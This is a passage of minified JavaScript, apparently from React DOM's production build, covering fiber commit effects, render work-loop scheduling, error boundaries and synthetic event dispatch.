jl(e,t){e=null,t.alternate!==null&&(e=t.alternate.memoizedState.cache),t=t.memoizedState.cache,t!==e&&(t.refCount++,e!=null&&fa(e))}function Ml(e,t,n,r){if(t.subtreeFlags&10256)for(t=t.child;t!==null;)Nl(e,t,n,r),t=t.sibling}function Nl(e,t,n,r){var i=t.flags;switch(t.tag){case 0:case 11:case 15:Ml(e,t,n,r),i&2048&&qc(9,t);break;case 1:Ml(e,t,n,r);break;case 3:Ml(e,t,n,r),i&2048&&(e=null,t.alternate!==null&&(e=t.alternate.memoizedState.cache),t=t.memoizedState.cache,t!==e&&(t.refCount++,e!=null&&fa(e)));break;case 12:if(i&2048){Ml(e,t,n,r),e=t.stateNode;try{var a=t.memoizedProps,o=a.id,s=a.onPostCommit;typeof s==`function`&&s(o,t.alternate===null?`mount`:`update`,e.passiveEffectDuration,-0)}catch(e){W(t,t.return,e)}}else Ml(e,t,n,r);break;case 31:Ml(e,t,n,r);break;case 13:Ml(e,t,n,r);break;case 23:break;case 22:a=t.stateNode,o=t.alternate,t.memoizedState===null?a._visibility&2?Ml(e,t,n,r):(a._visibility|=2,Pl(e,t,n,r,(t.subtreeFlags&10256)!=0||!1)):a._visibility&2?Ml(e,t,n,r):Fl(e,t),i&2048&&Al(o,t);break;case 24:Ml(e,t,n,r),i&2048&&jl(t.alternate,t);break;default:Ml(e,t,n,r)}}function Pl(e,t,n,r,i){for(i&&=(t.subtreeFlags&10256)!=0||!1,t=t.child;t!==null;){var a=e,o=t,s=n,c=r,l=o.flags;switch(o.tag){case 0:case 11:case 15:Pl(a,o,s,c,i),qc(8,o);break;case 23:break;case 22:var u=o.stateNode;o.memoizedState===null?(u._visibility|=2,Pl(a,o,s,c,i)):u._visibility&2?Pl(a,o,s,c,i):Fl(a,o),i&&l&2048&&Al(o.alternate,o);break;case 24:Pl(a,o,s,c,i),i&&l&2048&&jl(o.alternate,o);break;default:Pl(a,o,s,c,i)}t=t.sibling}}function Fl(e,t){if(t.subtreeFlags&10256)for(t=t.child;t!==null;){var n=e,r=t,i=r.flags;switch(r.tag){case 22:Fl(n,r),i&2048&&Al(r.alternate,r);break;case 24:Fl(n,r),i&2048&&jl(r.alternate,r);break;default:Fl(n,r)}t=t.sibling}}var Il=8192;function Ll(e,t,n){if(e.subtreeFlags&Il)for(e=e.child;e!==null;)Rl(e,t,n),e=e.sibling}function Rl(e,t,n){switch(e.tag){case 26:Ll(e,t,n),e.flags&Il&&e.memoizedState!==null&&Zf(n,Cl,e.memoizedState,e.memoizedProps);break;case 5:Ll(e,t,n);break;case 3:case 4:var r=Cl;Cl=Sf(e.stateNode.containerInfo),Ll(e,t,n),Cl=r;break;case 22:e.memoizedState===null&&(r=e.alternate,r!==null&&r.memoizedState!==null?(r=Il,Il=16777216,Ll(e,t,n),Il=r):Ll(e,t,n));break;default:Ll(e,t,n)}}function zl(e){var t=e.alternate;if(t!==null&&(e=t.child,e!==null)){t.child=null;do t=e.sibling,e.sibling=null,e=t;while(e!==null)}}function Bl(e){var t=e.deletions;if(e.flags&16){if(t!==null)for(var n=0;n<t.length;n++){var r=t[n];ul=r,Ul(r,e)}zl(e)}if(e.subtreeFlags&10256)for(e=e.child;e!==null;)Vl(e),e=e.sibling}function Vl(e){switch(e.tag){case 0:case 11:case 15:Bl(e),e.flags&2048&&Jc(9,e,e.return);break;case 3:Bl(e);break;case 12:Bl(e);break;case 22:var t=e.stateNode;e.memoizedState!==null&&t._visibility&2&&(e.return===null||e.return.tag!==13)?(t._visibility&=-3,Hl(e)):Bl(e);break;default:Bl(e)}}function Hl(e){var t=e.deletions;if(e.flags&16){if(t!==null)for(var n=0;n<t.length;n++){var r=t[n];ul=r,Ul(r,e)}zl(e)}for(e=e.child;e!==null;){switch(t=e,t.tag){case 0:case 11:case 15:Jc(8,t,t.return),Hl(t);break;case 22:n=t.stateNode,n._visibility&2&&(n._visibility&=-3,Hl(t));break;default:Hl(t)}e=e.sibling}}function Ul(e,t){for(;ul!==null;){var n=ul;switch(n.tag){case 0:case 11:case 15:Jc(8,n,t);break;case 23:case 22:if(n.memoizedState!==null&&n.memoizedState.cachePool!==null){var r=n.memoizedState.cachePool.pool;r!=null&&r.refCount++}break;case 24:fa(n.memoizedState.cache)}if(r=n.child,r!==null)r.return=n,ul=r;else a:for(n=e;ul!==null;){r=ul;var i=r.sibling,a=r.return;if(pl(r),r===n){ul=null;break a}if(i!==null){i.return=a,ul=i;break a}ul=a}}}var Wl={getCacheForType:function(e){var t=ia(ua),n=t.data.get(e);return n===void 0&&(n=e(),t.data.set(e,n)),n},cacheSignal:function(){return ia(ua).controller.signal}},Gl=typeof WeakMap==`function`?WeakMap:Map,z=0,B=null,V=null,H=0,U=0,Kl=null,ql=!1,Jl=!1,Yl=!1,Xl=0,Zl=0,Ql=0,$l=0,eu=0,tu=0,nu=0,ru=null,iu=null,au=!1,ou=0,su=0,cu=1/0,lu=null,uu=null,du=0,fu=null,pu=null,mu=0,hu=0,gu=null,_u=null,vu=0,yu=null;function bu(){return z&2&&H!==0?H&-H:k.T===null?dt():vd()}function xu(){if(tu===0)if(!(H&536870912)||F){var e=Xe;Xe<<=1,!(Xe&3932160)&&(Xe=262144),tu=e}else tu=536870912;return e=oo.current,e!==null&&(e.flags|=32),tu}function Su(e,t,n){(e===B&&(U===2||U===9)||e.cancelPendingCommit!==null)&&(ku(e,0),Eu(e,H,tu,!1)),it(e,n),(!(z&2)||e!==B)&&(e===B&&(!(z&2)&&($l|=n),Zl===4&&Eu(e,H,tu,!1)),ud(e))}function Cu(e,t,n){if(z&6)throw Error(i(327));var r=!n&&(t&127)==0&&(t&e.expiredLanes)===0||et(e,t),a=r?Lu(e,t):Fu(e,t,!0),o=r;do{if(a===0){Jl&&!r&&Eu(e,t,0,!1);break}else{if(n=e.current.alternate,o&&!Tu(n)){a=Fu(e,t,!1),o=!1;continue}if(a===2){if(o=t,e.errorRecoveryDisabledLanes&o)var s=0;else s=e.pendingLanes&-536870913,s=s===0?s&536870912?536870912:0:s;if(s!==0){t=s;a:{var c=e;a=ru;var l=c.current.memoizedState.isDehydrated;if(l&&(ku(c,s).flags|=256),s=Fu(c,s,!1),s!==2){if(Yl&&!l){c.errorRecoveryDisabledLanes|=o,$l|=o,a=4;break a}o=iu,iu=a,o!==null&&(iu===null?iu=o:iu.push.apply(iu,o))}a=s}if(o=!1,a!==2)continue}}if(a===1){ku(e,0),Eu(e,t,0,!0);break}a:{switch(r=e,o=a,o){case 0:case 1:throw Error(i(345));case 4:if((t&4194048)!==t)break;case 6:Eu(r,t,tu,!ql);break a;case 2:iu=null;break;case 3:case 5:break;default:throw Error(i(329))}if((t&62914560)===t&&(a=ou+300-Ne(),10<a)){if(Eu(r,t,tu,!ql),$e(r,0,!0)!==0)break a;mu=t,r.timeoutHandle=Qd(wu.bind(null,r,n,iu,lu,au,t,tu,$l,nu,ql,o,`Throttled`,-0,0),a);break a}wu(r,n,iu,lu,au,t,tu,$l,nu,ql,o,null,-0,0)}}break}while(1);ud(e)}function wu(e,t,n,r,i,a,o,s,c,l,u,d,f,p){if(e.timeoutHandle=-1,d=t.subtreeFlags,d&8192||(d&16785408)==16785408){d={stylesheets:null,count:0,imgCount:0,imgBytes:0,suspenseyImages:[],waitingForImages:!0,waitingForViewTransition:!1,unsuspend:cn},Rl(t,a,d);var m=(a&62914560)===a?ou-Ne():(a&4194048)===a?su-Ne():0;if(m=$f(d,m),m!==null){mu=a,e.cancelPendingCommit=m(Wu.bind(null,e,t,a,n,r,i,o,s,c,u,d,null,f,p)),Eu(e,a,o,!l);return}}Wu(e,t,a,n,r,i,o,s,c)}function Tu(e){for(var t=e;;){var n=t.tag;if((n===0||n===11||n===15)&&t.flags&16384&&(n=t.updateQueue,n!==null&&(n=n.stores,n!==null)))for(var r=0;r<n.length;r++){var i=n[r],a=i.getSnapshot;i=i.value;try{if(!Ar(a(),i))return!1}catch{return!1}}if(n=t.child,t.subtreeFlags&16384&&n!==null)n.return=t,t=n;else{if(t===e)break;for(;t.sibling===null;){if(t.return===null||t.return===e)return!0;t=t.return}t.sibling.return=t.return,t=t.sibling}}return!0}function Eu(e,t,n,r){t&=~eu,t&=~$l,e.suspendedLanes|=t,e.pingedLanes&=~t,r&&(e.warmLanes|=t),r=e.expirationTimes;for(var i=t;0<i;){var a=31-Ge(i),o=1<<a;r[a]=-1,i&=~o}n!==0&&ot(e,n,t)}function Du(){return z&6?!0:(dd(0,!1),!1)}function Ou(){if(V!==null){if(U===0)var e=V.return;else e=V,Zi=Xi=null,No(e),Fa=null,Ia=0,e=V;for(;e!==null;)Kc(e.alternate,e),e=e.return;V=null}}function ku(e,t){var n=e.timeoutHandle;n!==-1&&(e.timeoutHandle=-1,$d(n)),n=e.cancelPendingCommit,n!==null&&(e.cancelPendingCommit=null,n()),mu=0,Ou(),B=e,V=n=gi(e.current,null),H=t,U=0,Kl=null,ql=!1,Jl=et(e,t),Yl=!1,nu=tu=eu=$l=Ql=Zl=0,iu=ru=null,au=!1,t&8&&(t|=t&32);var r=e.entangledLanes;if(r!==0)for(e=e.entanglements,r&=t;0<r;){var i=31-Ge(r),a=1<<i;t|=e[i],r&=~a}return Xl=t,si(),n}function Au(e,t){L=null,k.H=Us,t===Ta||t===Da?(t=Na(),U=3):t===Ea?(t=Na(),U=4):U=t===sc?8:typeof t==`object`&&t&&typeof t.then==`function`?6:1,Kl=t,V===null&&(Zl=1,tc(e,wi(t,e.current)))}function ju(){var e=oo.current;return e===null?!0:(H&4194048)===H?so===null:(H&62914560)===H||H&536870912?e===so:!1}function Mu(){var e=k.H;return k.H=Us,e===null?Us:e}function Nu(){var e=k.A;return k.A=Wl,e}function Pu(){Zl=4,ql||(H&4194048)!==H&&oo.current!==null||(Jl=!0),!(Ql&134217727)&&!($l&134217727)||B===null||Eu(B,H,tu,!1)}function Fu(e,t,n){var r=z;z|=2;var i=Mu(),a=Nu();(B!==e||H!==t)&&(lu=null,ku(e,t)),t=!1;var o=Zl;a:do try{if(U!==0&&V!==null){var s=V,c=Kl;switch(U){case 8:Ou(),o=6;break a;case 3:case 2:case 9:case 6:oo.current===null&&(t=!0);var l=U;if(U=0,Kl=null,Vu(e,s,c,l),n&&Jl){o=0;break a}break;default:l=U,U=0,Kl=null,Vu(e,s,c,l)}}Iu(),o=Zl;break}catch(t){Au(e,t)}while(1);return t&&e.shellSuspendCounter++,Zi=Xi=null,z=r,k.H=i,k.A=a,V===null&&(B=null,H=0,si()),o}function Iu(){for(;V!==null;)zu(V)}function Lu(e,t){var n=z;z|=2;var r=Mu(),a=Nu();B!==e||H!==t?(lu=null,cu=Ne()+500,ku(e,t)):Jl=et(e,t);a:do try{if(U!==0&&V!==null){t=V;var o=Kl;b:switch(U){case 1:U=0,Kl=null,Vu(e,t,o,1);break;case 2:case 9:if(ka(o)){U=0,Kl=null,Bu(t);break}t=function(){U!==2&&U!==9||B!==e||(U=7),ud(e)},o.then(t,t);break a;case 3:U=7;break a;case 4:U=5;break a;case 7:ka(o)?(U=0,Kl=null,Bu(t)):(U=0,Kl=null,Vu(e,t,o,7));break;case 5:var s=null;switch(V.tag){case 26:s=V.memoizedState;case 5:case 27:var c=V;if(s?Xf(s):c.stateNode.complete){U=0,Kl=null;var l=c.sibling;if(l!==null)V=l;else{var u=c.return;u===null?V=null:(V=u,Hu(u))}break b}}U=0,Kl=null,Vu(e,t,o,5);break;case 6:U=0,Kl=null,Vu(e,t,o,6);break;case 8:Ou(),Zl=6;break a;default:throw Error(i(462))}}Ru();break}catch(t){Au(e,t)}while(1);return Zi=Xi=null,k.H=r,k.A=a,z=n,V===null?(B=null,H=0,si(),Zl):0}function Ru(){for(;V!==null&&!je();)zu(V)}function zu(e){var t=Lc(e.alternate,e,Xl);e.memoizedProps=e.pendingProps,t===null?Hu(e):V=t}function Bu(e){var t=e,n=t.alternate;switch(t.tag){case 15:case 0:t=xc(n,t,t.pendingProps,t.type,void 0,H);break;case 11:t=xc(n,t,t.pendingProps,t.type.render,t.ref,H);break;case 5:No(t);default:Kc(n,t),t=V=_i(t,Xl),t=Lc(n,t,Xl)}e.memoizedProps=e.pendingProps,t===null?Hu(e):V=t}function Vu(e,t,n,r){Zi=Xi=null,No(t),Fa=null,Ia=0;var i=t.return;try{if(oc(e,i,t,n,H)){Zl=1,tc(e,wi(n,e.current)),V=null;return}}catch(t){if(i!==null)throw V=i,t;Zl=1,tc(e,wi(n,e.current)),V=null;return}t.flags&32768?(F||r===1?e=!0:Jl||H&536870912?e=!1:(ql=e=!0,(r===2||r===9||r===3||r===6)&&(r=oo.current,r!==null&&r.tag===13&&(r.flags|=16384))),Uu(t,e)):Hu(t)}function Hu(e){var t=e;do{if(t.flags&32768){Uu(t,ql);return}e=t.return;var n=Wc(t.alternate,t,Xl);if(n!==null){V=n;return}if(t=t.sibling,t!==null){V=t;return}V=t=e}while(t!==null);Zl===0&&(Zl=5)}function Uu(e,t){do{var n=Gc(e.alternate,e);if(n!==null){n.flags&=32767,V=n;return}if(n=e.return,n!==null&&(n.flags|=32768,n.subtreeFlags=0,n.deletions=null),!t&&(e=e.sibling,e!==null)){V=e;return}V=e=n}while(e!==null);Zl=6,V=null}function Wu(e,t,n,r,a,o,s,c,l){e.cancelPendingCommit=null;do Yu();while(du!==0);if(z&6)throw Error(i(327));if(t!==null){if(t===e.current)throw Error(i(177));if(o=t.lanes|t.childLanes,o|=oi,at(e,n,o,s,c,l),e===B&&(V=B=null,H=0),pu=t,fu=e,mu=n,hu=o,gu=a,_u=r,t.subtreeFlags&10256||t.flags&10256?(e.callbackNode=null,e.callbackPriority=0,rd(Le,function(){return Xu(),null})):(e.callbackNode=null,e.callbackPriority=0),r=(t.flags&13878)!=0,t.subtreeFlags&13878||r){r=k.T,k.T=null,a=A.p,A.p=2,s=z,z|=4;try{dl(e,t,n)}finally{z=s,A.p=a,k.T=r}}du=1,Gu(),Ku(),qu()}}function Gu(){if(du===1){du=0;var e=fu,t=pu,n=(t.flags&13878)!=0;if(t.subtreeFlags&13878||n){n=k.T,k.T=null;var r=A.p;A.p=2;var i=z;z|=4;try{wl(t,e);var a=Gd,o=Fr(e.containerInfo),s=a.focusedElem,c=a.selectionRange;if(o!==s&&s&&s.ownerDocument&&Pr(s.ownerDocument.documentElement,s)){if(c!==null&&Ir(s)){var l=c.start,u=c.end;if(u===void 0&&(u=l),`selectionStart`in s)s.selectionStart=l,s.selectionEnd=Math.min(u,s.value.length);else{var d=s.ownerDocument||document,f=d&&d.defaultView||window;if(f.getSelection){var p=f.getSelection(),m=s.textContent.length,h=Math.min(c.start,m),g=c.end===void 0?h:Math.min(c.end,m);!p.extend&&h>g&&(o=g,g=h,h=o);var _=Nr(s,h),v=Nr(s,g);if(_&&v&&(p.rangeCount!==1||p.anchorNode!==_.node||p.anchorOffset!==_.offset||p.focusNode!==v.node||p.focusOffset!==v.offset)){var y=d.createRange();y.setStart(_.node,_.offset),p.removeAllRanges(),h>g?(p.addRange(y),p.extend(v.node,v.offset)):(y.setEnd(v.node,v.offset),p.addRange(y))}}}}for(d=[],p=s;p=p.parentNode;)p.nodeType===1&&d.push({element:p,left:p.scrollLeft,top:p.scrollTop});for(typeof s.focus==`function`&&s.focus(),s=0;s<d.length;s++){var b=d[s];b.element.scrollLeft=b.left,b.element.scrollTop=b.top}}pp=!!Wd,Gd=Wd=null}finally{z=i,A.p=r,k.T=n}}e.current=t,du=2}}function Ku(){if(du===2){du=0;var e=fu,t=pu,n=(t.flags&8772)!=0;if(t.subtreeFlags&8772||n){n=k.T,k.T=null;var r=A.p;A.p=2;var i=z;z|=4;try{fl(e,t.alternate,t)}finally{z=i,A.p=r,k.T=n}}du=3}}function qu(){if(du===4||du===3){du=0,Me();var e=fu,t=pu,n=mu,r=_u;t.subtreeFlags&10256||t.flags&10256?du=5:(du=0,pu=fu=null,Ju(e,e.pendingLanes));var i=e.pendingLanes;if(i===0&&(uu=null),ut(n),t=t.stateNode,Ue&&typeof Ue.onCommitFiberRoot==`function`)try{Ue.onCommitFiberRoot(He,t,void 0,(t.current.flags&128)==128)}catch{}if(r!==null){t=k.T,i=A.p,A.p=2,k.T=null;try{for(var a=e.onRecoverableError,o=0;o<r.length;o++){var s=r[o];a(s.value,{componentStack:s.stack})}}finally{k.T=t,A.p=i}}mu&3&&Yu(),ud(e),i=e.pendingLanes,n&261930&&i&42?e===yu?vu++:(vu=0,yu=e):vu=0,dd(0,!1)}}function Ju(e,t){(e.pooledCacheLanes&=t)===0&&(t=e.pooledCache,t!=null&&(e.pooledCache=null,fa(t)))}function Yu(){return Gu(),Ku(),qu(),Xu()}function Xu(){if(du!==5)return!1;var e=fu,t=hu;hu=0;var n=ut(mu),r=k.T,a=A.p;try{A.p=32>n?32:n,k.T=null,n=gu,gu=null;var o=fu,s=mu;if(du=0,pu=fu=null,mu=0,z&6)throw Error(i(331));var c=z;if(z|=4,Vl(o.current),Nl(o,o.current,s,n),z=c,dd(0,!1),Ue&&typeof Ue.onPostCommitFiberRoot==`function`)try{Ue.onPostCommitFiberRoot(He,o)}catch{}return!0}finally{A.p=a,k.T=r,Ju(e,t)}}function Zu(e,t,n){t=wi(n,t),t=rc(e.stateNode,t,2),e=qa(e,t,2),e!==null&&(it(e,2),ud(e))}function W(e,t,n){if(e.tag===3)Zu(e,e,n);else for(;t!==null;){if(t.tag===3){Zu(t,e,n);break}else if(t.tag===1){var r=t.stateNode;if(typeof t.type.getDerivedStateFromError==`function`||typeof r.componentDidCatch==`function`&&(uu===null||!uu.has(r))){e=wi(n,e),n=ic(2),r=qa(t,n,2),r!==null&&(ac(n,r,t,e),it(r,2),ud(r));break}}t=t.return}}function Qu(e,t,n){var r=e.pingCache;if(r===null){r=e.pingCache=new Gl;var i=new Set;r.set(t,i)}else i=r.get(t),i===void 0&&(i=new Set,r.set(t,i));i.has(n)||(Yl=!0,i.add(n),e=$u.bind(null,e,t,n),t.then(e,e))}function $u(e,t,n){var r=e.pingCache;r!==null&&r.delete(t),e.pingedLanes|=e.suspendedLanes&n,e.warmLanes&=~n,B===e&&(H&n)===n&&(Zl===4||Zl===3&&(H&62914560)===H&&300>Ne()-ou?!(z&2)&&ku(e,0):eu|=n,nu===H&&(nu=0)),ud(e)}function ed(e,t){t===0&&(t=nt()),e=ui(e,t),e!==null&&(it(e,t),ud(e))}function td(e){var t=e.memoizedState,n=0;t!==null&&(n=t.retryLane),ed(e,n)}function nd(e,t){var n=0;switch(e.tag){case 31:case 13:var r=e.stateNode,a=e.memoizedState;a!==null&&(n=a.retryLane);break;case 19:r=e.stateNode;break;case 22:r=e.stateNode._retryCache;break;default:throw Error(i(314))}r!==null&&r.delete(t),ed(e,n)}function rd(e,t){return ke(e,t)}var id=null,ad=null,od=!1,sd=!1,cd=!1,ld=0;function ud(e){e!==ad&&e.next===null&&(ad===null?id=ad=e:ad=ad.next=e),sd=!0,od||(od=!0,_d())}function dd(e,t){if(!cd&&sd){cd=!0;do for(var n=!1,r=id;r!==null;){if(!t)if(e!==0){var i=r.pendingLanes;if(i===0)var a=0;else{var o=r.suspendedLanes,s=r.pingedLanes;a=(1<<31-Ge(42|e)+1)-1,a&=i&~(o&~s),a=a&201326741?a&201326741|1:a?a|2:0}a!==0&&(n=!0,gd(r,a))}else a=H,a=$e(r,r===B?a:0,r.cancelPendingCommit!==null||r.timeoutHandle!==-1),!(a&3)||et(r,a)||(n=!0,gd(r,a));r=r.next}while(n);cd=!1}}function fd(){pd()}function pd(){sd=od=!1;var e=0;ld!==0&&Zd()&&(e=ld);for(var t=Ne(),n=null,r=id;r!==null;){var i=r.next,a=md(r,t);a===0?(r.next=null,n===null?id=i:n.next=i,i===null&&(ad=n)):(n=r,(e!==0||a&3)&&(sd=!0)),r=i}du!==0&&du!==5||dd(e,!1),ld!==0&&(ld=0)}function md(e,t){for(var n=e.suspendedLanes,r=e.pingedLanes,i=e.expirationTimes,a=e.pendingLanes&-62914561;0<a;){var o=31-Ge(a),s=1<<o,c=i[o];c===-1?((s&n)===0||(s&r)!==0)&&(i[o]=tt(s,t)):c<=t&&(e.expiredLanes|=s),a&=~s}if(t=B,n=H,n=$e(e,e===t?n:0,e.cancelPendingCommit!==null||e.timeoutHandle!==-1),r=e.callbackNode,n===0||e===t&&(U===2||U===9)||e.cancelPendingCommit!==null)return r!==null&&r!==null&&Ae(r),e.callbackNode=null,e.callbackPriority=0;if(!(n&3)||et(e,n)){if(t=n&-n,t===e.callbackPriority)return t;switch(r!==null&&Ae(r),ut(n)){case 2:case 8:n=Ie;break;case 32:n=Le;break;case 268435456:n=ze;break;default:n=Le}return r=hd.bind(null,e),n=ke(n,r),e.callbackPriority=t,e.callbackNode=n,t}return r!==null&&r!==null&&Ae(r),e.callbackPriority=2,e.callbackNode=null,2}function hd(e,t){if(du!==0&&du!==5)return e.callbackNode=null,e.callbackPriority=0,null;var n=e.callbackNode;if(Yu()&&e.callbackNode!==n)return null;var r=H;return r=$e(e,e===B?r:0,e.cancelPendingCommit!==null||e.timeoutHandle!==-1),r===0?null:(Cu(e,r,t),md(e,Ne()),e.callbackNode!=null&&e.callbackNode===n?hd.bind(null,e):null)}function gd(e,t){if(Yu())return null;Cu(e,t,!0)}function _d(){tf(function(){z&6?ke(Fe,fd):pd()})}function vd(){if(ld===0){var e=ha;e===0&&(e=Ye,Ye<<=1,!(Ye&261888)&&(Ye=256)),ld=e}return ld}function G(e){return e==null||typeof e==`symbol`||typeof e==`boolean`?null:typeof e==`function`?e:sn(``+e)}function yd(e,t){var n=t.ownerDocument.createElement(`input`);return n.name=t.name,n.value=t.value,e.id&&n.setAttribute(`form`,e.id),t.parentNode.insertBefore(n,t),e=new FormData(e),n.parentNode.removeChild(n),e}function bd(e,t,n,r,i){if(t===`submit`&&n&&n.stateNode===i){var a=G((i[ht]||null).action),o=r.submitter;o&&(t=(t=o[ht]||null)?G(t.formAction):o.getAttribute(`formAction`),t!==null&&(a=t,o=null));var s=new kn(`action`,`action`,null,r,i);e.push({event:s,listeners:[{instance:null,listener:function(){if(r.defaultPrevented){if(ld!==0){var e=o?yd(i,o):new FormData(i);ks(n,{pending:!0,data:e,method:i.method,action:a},null,e)}}else typeof a==`function`&&(s.preventDefault(),e=o?yd(i,o):new FormData(i),ks(n,{pending:!0,data:e,method:i.method,action:a},a,e))},currentTarget:i}]})}}for(var xd=0;xd<ti.length;xd++){var Sd=ti[xd];ni(Sd.toLowerCase(),`on`+(Sd[0].toUpperCase()+Sd.slice(1)))}ni(qr,`onAnimationEnd`),ni(Jr,`onAnimationIteration`),ni(Yr,`onAnimationStart`),ni(`dblclick`,`onDoubleClick`),ni(`focusin`,`onFocus`),ni(`focusout`,`onBlur`),ni(Xr,`onTransitionRun`),ni(Zr,`onTransitionStart`),ni(Qr,`onTransitionCancel`),ni($r,`onTransitionEnd`),jt(`onMouseEnter`,[`mouseout`,`mouseover`]),jt(`onMouseLeave`,[`mouseout`,`mouseover`]),jt(`onPointerEnter`,[`pointerout`,`pointerover`]),jt(`onPointerLeave`,[`pointerout`,`pointerover`]),At(`onChange`,`change click focusin focusout input keydown keyup selectionchange`.split(` `)),At(`onSelect`,`focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange`.split(` `)),At(`onBeforeInput`,[`compositionend`,`keypress`,`textInput`,`paste`]),At(`onCompositionEnd`,`compositionend focusout keydown keypress keyup mousedown`.split(` `)),At(`onCompositionStart`,`compositionstart focusout keydown keypress keyup mousedown`.split(` `)),At(`onCompositionUpdate`,`compositionupdate focusout keydown keypress keyup mousedown`.split(` `));var Cd=`abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting`.split(` `),wd=new Set(`beforetoggle cancel close invalid load scroll scrollend toggle`.split(` `).concat(Cd));function Td(e,t){t=(t&4)!=0;for(var n=0;n<e.length;n++){var r=e[n],i=r.event;r=r.listeners;a:{var a=void 0;if(t)for(var o=r.length-1;0<=o;o--){var s=r[o],c=s.instance,l=s.currentTarget;if(s=s.listener,c!==a&&i.isPropagationStopped())break a;a=s,i.currentTarget=l;try{a(i)}catch(e){ri(e)}i.currentTarget=null,a=c}else for(o=0;o<r.length;o++){if(s=r[o],c=s.instance,l=s.currentTarget,s=s.listener,c!==a&&i.isPropagationStopped())break a;a=s,i.currentTarget=l;try{a(i)}catch(e){ri(e)}i.currentTarget=null,a=c}}}}function K(e,t){var n=t[_t];n===void 0&&(n=t[_t]=new Set);var r=e+`__bubble`;n.has(r)||(kd(t,e,2,!1),n.add(r))}function Ed(e,t,n){var r=0;t&&(r|=4),kd(n,e,r,t)}var Dd=`_reactListening`+Math.random().toString(36).slice(2);function Od(e){if(!e[Dd]){e[Dd]=!0,Ot.forEach(function(t){t!==`selectionchange`&&(wd.has(t)||Ed(t,!1,e),Ed(t,!0,e))});var t=e.nodeType===9?e:e.ownerDocument;t===null||t[Dd]||(t[Dd]=!0,Ed(`selectionchange`,!1,t))}}function kd(e,t,n,r){switch(bp(t)){case 2:var i=mp;break;case 8:i=hp;break;default:i=gp}n=i.bind(null,t,n,e),i=void 0,!vn||t!==`touchstart`&&t!==`touchmove`&&t!==`wheel`||(i=!0),r?i===void 0?e.addEventListener(t,n,!0):e.addEventListener(t,n,{capture:!0,passive:i}):i===void 0?e.addEventListener(t,n,!1):e.addEventListener(t,n,{passive:i})}function Ad(e,t,n,r,i){var a=r;if(!(t&1)&&!(t&2)&&r!==null)a:for(;;){if(r===null)return;var s=r.tag;if(s===3||s===4){var c=r.stateNode.containerInfo;if(c===i)break;if(s===4)for(s=r.return;s!==null;){var l=s.tag;if((l===3||l===4)&&s.stateNode.containerInfo===i)return;s=s.return}for(;c!==null;){if(s=Ct(c),s===null)return;if(l=s.tag,l===5||l===6||l===26||l===27){r=a=s;continue a}c=c.parentNode}}r=r.return}hn(function(){var r=a,i=un(n),s=[];a:{var c=ei.get(e);if(c!==void 0){var l=kn,u=e;switch(e){case`keypress`:if(wn(n)===0)break a;case`keydown`:case`keyup`:l=qn;break;case`focusin`:u=`focus`,l=Rn;break;case`focusout`:u=`blur`,l=Rn;break;case`beforeblur`:case`afterblur`:l=Rn;break;case`click`:if(n.button===2)break a;case`auxclick`:case`dblclick`:case`mousedown`:case`mousemove`:case`mouseup`:case`mouseout`:case`mouseover`:case`contextmenu`:l=In;break;case`drag`:case`dragend`:case`dragenter`:case`dragexit`:case`dragleave`:case`dragover`:case`dragstart`:case`drop`:l=Ln;break;case`touchcancel`:case`touchend`:case`touchmove`:case`touchstart`:l=Yn;break;case qr:case Jr:case Yr:l=zn;break;case $r:l=Xn;break;case`scroll`:case`scrollend`:l=jn;break;case`wheel`:l=Zn;break;case`copy`:case`cut`:case`paste`:l=Bn;break;case`gotpointercapture`:case`lostpointercapture`:case`pointercancel`:case`pointerdown`:case`pointermove`:case`pointerout`:case`pointerover`:case`pointerup`:l=Jn;break;case`toggle`:case`beforetoggle`:l=Qn}var d=(t&4)!=0,f=!d&&(e===`scroll`||e===`scrollend`),p=d?c===null?null:c+`Capture`:c;d=[];for(var m=r,h;m!==null;){var g=m;if(h=g.stateNode,g=g.tag,g!==5&&g!==26&&g!==27||h===null||p===null||(g=gn(m,p),g!=null&&d.push(jd(m,g,h))),f)break;m=m.return}0<d.length&&(c=new l(c,u,null,n,i),s.push({event:c,listeners:d}))}}if(!(t&7)){a:{if(c=e===`mouseover`||e===`pointerover`,l=e===`mouseout`||e===`pointerout`,c&&n!==ln&&(u=n.relatedTarget||n.fromElement)&&(Ct(u)||u[gt]))break a;if((l||c)&&(c=i.window===i?i:(c=i.ownerDocument)?c.defaultView||c.parentWindow:window,l?(u=n.relatedTarget||n.toElement,l=r,u=u?Ct(u):null,u!==null&&(f=o(u),d=u.tag,u!==f||d!==5&&d!==27&&d!==6)&&(u=null)):(l=null,u=r),l!==u)){if(d=In,g=`onMouseLeave`,p=`onMouseEnter`,m=`mouse`,(e===`pointerout`||e===`pointerover`)&&(d=Jn,g=`onPointerLeave`,p=`onPointerEnter`,m=`pointer`),f=l==null?c:Tt(l),h=u==null?c:Tt(u),c=new d(g,m+`leave`,l,n,i),c.target=f,c.relatedTarget=h,g=null,Ct(i)===r&&(d=new d(p,m+`enter`,u,n,i),d.target=h,d.relatedTarget=f,g=d),f=g,l&&u)b:{for(d=Nd,p=l,m=u,h=0,g=p;g;g=d(g))h++;g=0;for(var _=m;_;_=d(_))g++;for(;0<h-g;)p=d(p),h--;for(;0<g-h;)m=d(m),g--;for(;h--;){if(p===m||m!==null&&p===m.alternate){d=p;break b}p=d(p),m=d(m)}d=null}else d=null;l!==null&&Pd(s,c,l,d,!1),u!==null&&f!==null&&Pd(s,f,u,d,!0)}}a:{if(c=r?Tt(r):window,l=c.nodeName&&c.nodeName.toLowerCase(),l===`select`||l===`input`&&c.type===`file`)var v=vr;else if(fr(c))if(yr)v=Or;else{v=Er;var y=Tr}else l=c.nodeName,!l||l.toLowerCase()!==`input`||c.type!==`checkbox`&&c.type!==`radio`?r&&rn(r.elementType)&&(v=vr):v=Dr;if(v&&=v(e,r)){pr(s,v,n,i);break a}y&&y(e,c,r),e===`focusout`&&r&&c.type===`number`&&r.memoizedProps.value!=null&&Yt(c,`number`,c.value)}switch(y=r?Tt(r):window,e){case`focusin`:(fr(y)||y.contentEditable===`true`)&&(Rr=y,j=r,zr=null);break;case`focusout`:zr=j=Rr=null;break;case`mousedown`:Br=!0;break;case`contextmenu`:case`mouseup`:case`dragend`:Br=!1,Vr(s,n,i);break;case`selectionchange`:if(Lr)break;case`keydown`:case`keyup`:Vr(s,n,i)}var b;if(er)b:{switch(e){case`compositionstart`:var 